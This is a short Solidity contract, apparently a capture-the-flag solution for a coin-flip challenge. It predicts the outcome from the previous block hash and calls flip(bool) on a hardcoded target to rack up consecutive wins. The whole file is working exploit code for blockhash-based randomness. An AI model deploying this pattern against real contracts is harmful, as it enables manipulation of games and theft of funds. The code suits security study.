// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

    interface ICoinFlip {
        function consecutiveWins() external view returns(uint);
    }

contract CoinFlipAttack {

  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
  // Use your instance address here. 
  address victim = address(0xa2F8006c2A1dF0d2C28b2Fe861109FF02db11846);

  function setValues() external returns (bool){
    
    uint256 blockValue = uint256(blockhash(block.number - 1));

    uint256 coinFlip = blockValue / FACTOR;
    bool side = coinFlip == 1 ? true : false;

    (bool success, ) = victim.call(abi.encodeWithSignature("flip(bool)", side));
    require(success, "failed!");

    return (success);
  }

  function getWins() external view returns (uint) {
    return  ICoinFlip(victim).consecutiveWins();
  }

}